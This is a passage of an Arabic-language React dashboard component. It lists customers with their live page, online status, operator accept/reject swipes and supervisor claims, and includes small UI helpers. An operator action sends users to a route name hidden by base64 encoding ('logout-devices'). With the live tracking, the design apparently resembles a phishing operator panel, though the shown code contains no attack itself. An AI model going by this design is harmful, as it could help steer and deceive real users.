                <p className="text-[11px] text-rose-500">تحقق من الاتصال ثم أعد المحاولة.</p>
                <button onClick={refresh} className="mt-1 rounded-xl bg-rose-600 px-4 py-2 text-[11px] font-black text-white shadow-sm transition active:scale-95 hover:bg-rose-700">
                  إعادة المحاولة
                </button>
              </div>
            )}

            {filter.filter === "latest" ? (
              <LatestFeed subs={subQ.data ?? []} onOpen={(k) => openCustomer(k)} />
            ) : (
              <div className="space-y-2 md:grid md:grid-cols-2 md:gap-3 md:space-y-0 xl:grid-cols-3">
                {filter.list.length === 0 && !reqQ.isLoading && (
                  <div className="flex flex-col items-center gap-2 rounded-2xl border border-dashed border-slate-300 bg-white p-8 text-center md:col-span-full md:p-12">
                    <div className="grid size-12 place-items-center rounded-2xl bg-slate-100 text-2xl">🔍</div>
                    <p className="text-xs font-bold text-slate-700">لا يوجد عملاء يطابقون هذا الفلتر</p>
                    <p className="text-[11px] text-slate-500">جرّب فلتراً آخر أو امسح البحث</p>
                    {filter.filter !== "all" && (
                      <button onClick={() => { filter.setFilter("all"); filter.setQuery(""); }}
                        className="mt-1 rounded-xl bg-orange-500 px-4 py-2 text-[11px] font-black text-white shadow-sm transition active:scale-95 hover:bg-orange-600">
                        عرض الكل
                      </button>
                    )}
                  </div>
                )}
                {filter.list.slice(0, visibleCount).map((c) => {
                  const acted = (actedQ.data as Record<string, { route?: string | null; actor?: string | null } | undefined> | undefined)?.[c.key];
                  const sentToLogout = acted?.route === "/bG9nb3V0LWRldmljZXM";
                  const confirmed = c.logoutConfirmed;
                  const claim = (claimsQ.data as Record<string, { supervisor: string }> | undefined)?.[c.key];
                  const claimedBy = claim?.supervisor ?? null;
                  const lockedByOther = false;
                  const h = rowHandlers(c.key);
                  const rowProps: CustomerRowProps = {
                    c, online: isOnline(c), livePage: livePageFor(c),
                    onOpen: h.open, onSwipeAccept, onSwipeReject,
                    sentToLogout, logoutConfirmed: confirmed,
                    actedActor: acted?.actor ?? null,
                    actedRoute: acted?.route ?? null,
                    claimedBy, lockedByOther,
                    compact: compactRows,
                  };
                  if (sentToLogout && !confirmed) rowProps.onConfirmLogout = h.confirm;
                  return <CustomerRow key={c.key} {...rowProps} />;
                })}
                {filter.list.length > visibleCount && (
                  <LoadMore key={`more-${visibleCount}`} onHit={() => setVisibleCount((v) => v + 40)} remaining={filter.list.length - visibleCount} />
                )}
              </div>
            )}
          </>
        )}
      </div>

      <ScrollTopButton />

      {typeof document !== "undefined" && createPortal(<div className="dash-dark"><nav dir="rtl" className="fixed bottom-0 left-0 right-0 z-50 border-t border-slate-200 bg-white/95 px-2 pt-1.5 pb-[max(0.5rem,env(safe-area-inset-bottom))] shadow-lg backdrop-blur md:bottom-4 md:left-1/2 md:right-auto md:w-[28rem] md:-translate-x-1/2 md:rounded-2xl md:border md:pb-1.5 md:shadow-xl">
        <div className="mx-auto flex max-w-md items-center justify-between gap-1">
          {NAV_FILTERS.map((f) => {
            const tone = FILTER_TONES[f.key] ?? FILTER_TONES['all']!;
            const Icon = f.key === "all" ? Home : tone.icon;
            const active = !current && filter.filter === f.key;
            const n = f.key === "latest" ? (latestCount ?? 0) : (navCounts[f.key] ?? 0);
            return (
              <button key={f.key} onClick={() => { filter.setFilter(f.key); if (selected) closeCustomer(); setTab("home"); window.scrollTo({ top: 0, behavior: "smooth" }); }}
                className={`flex flex-1 min-w-0 flex-col items-center gap-0.5 rounded-xl border px-1.5 py-1.5 text-[10px] font-bold transition-all active:scale-95 ${active ? tone.active + " shadow-sm" : "border-transparent text-slate-500 hover:bg-slate-50"}`}>
                <div className="relative">
                  <Icon className="size-4" />
                  {n > 0 && (
                    <span className={`absolute -top-1.5 -right-2 min-w-[14px] rounded-full px-1 text-[8.5px] font-black leading-[14px] tabular-nums ${active ? "bg-white text-slate-900" : "bg-slate-800 text-white"}`}>
                      {n > 99 ? "99+" : n}
                    </span>
                  )}
                </div>
                <span className="truncate">{f.label}</span>
              </button>
            );
          })}
        </div>
      </nav></div>, document.body)}

      {pushOpen && <Suspense fallback={null}><PushSettingsDialog onClose={() => setPushOpen(false)} /></Suspense>}
      {logOpen && <LogDialog onClose={() => setLogOpen(false)} />}
    </div>
  );
}

function ScrollTopButton() {
  const [show, setShow] = useState(false);
  useEffect(() => {
    const onScroll = () => setShow(window.scrollY > 300);
    window.addEventListener("scroll", onScroll, { passive: true });
    return () => window.removeEventListener("scroll", onScroll);
  }, []);
  if (!show) return null;
  return (
    <button onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })} aria-label="للأعلى"
      className="fixed bottom-24 left-4 md:bottom-6 md:left-6 z-40 grid size-10 place-items-center rounded-full bg-slate-800/90 text-white shadow-lg backdrop-blur transition active:scale-95 hover:bg-slate-900">
      <ArrowUp className="size-4" />
    </button>
  );
}

function ToolBtn({ onClick, label, title, disabled, children }: { onClick: () => void; label: string; title?: string; disabled?: boolean; children: ReactNode }) {
  return (
    <button type="button" onClick={onClick} disabled={disabled} aria-label={label} title={title ?? label}
      className="flex flex-col items-center justify-center gap-0.5 rounded-lg px-2.5 py-1.5 text-slate-600 transition active:scale-95 hover:bg-white hover:text-slate-900 hover:shadow-sm disabled:opacity-40 disabled:active:scale-100">
      {children}
      <span className="text-[10px] font-black leading-none">{label}</span>
    </button>
  );
}

function StatBox({ value, label, Icon, ring, tone, iconTone, pulse, onClick, active, activeTone }: { value: number | null; label: string; Icon: typeof Home; ring: string; tone: string; iconTone: string; pulse?: boolean; onClick?: () => void; active?: boolean; activeTone?: string }) {
  return (
    <button type="button" onClick={onClick} aria-label={label} aria-pressed={!!active}
      className={`group relative overflow-hidden rounded-2xl border bg-gradient-to-b ${ring} p-3 text-center shadow-sm transition-all md:p-4 active:scale-95 hover:shadow-md ${active ? `border-transparent ring-2 ${activeTone ?? "ring-orange-500"} shadow-md` : "border-slate-200/80 hover:border-orange-300"}`}>
      <div className="mb-1 flex items-center justify-center gap-1.5">
        <Icon className={`size-3.5 ${iconTone} ${pulse ? "animate-pulse" : ""}`} />
        <span className="text-[11.5px] font-black text-slate-600">{label}</span>
      </div>
      <div className={`text-2xl md:text-3xl font-black leading-tight tabular-nums ${tone}`}>{value == null ? "—" : value}</div>
    </button>
  );
}


// عنصر نهاية القائمة: يحمّل 40 بطاقة إضافية عند الوصول إليه بالتمرير.
function LoadMore({ onHit, remaining }: { onHit: () => void; remaining: number }) {
  const ref = useRef<HTMLDivElement | null>(null);
  const hitRef = useRef(onHit); hitRef.current = onHit;
  useEffect(() => {
    const el = ref.current;
    if (!el || typeof window.IntersectionObserver !== "function") return;
    const io = new IntersectionObserver((entries) => {
      if (entries.some((e) => e.isIntersecting)) hitRef.current();
    }, { rootMargin: "1000px 0px" });
    io.observe(el);
    return () => io.disconnect();
  }, []);
  return (
    <div ref={ref} className="md:col-span-full flex justify-center py-4">
      <button onClick={() => hitRef.current()} className="rounded-xl border border-slate-200 bg-white px-4 py-2 text-[11px] font-black text-slate-600 shadow-sm transition active:scale-95 hover:bg-slate-50">
        عرض المزيد ({remaining})
      </button>
    </div>
  );
}
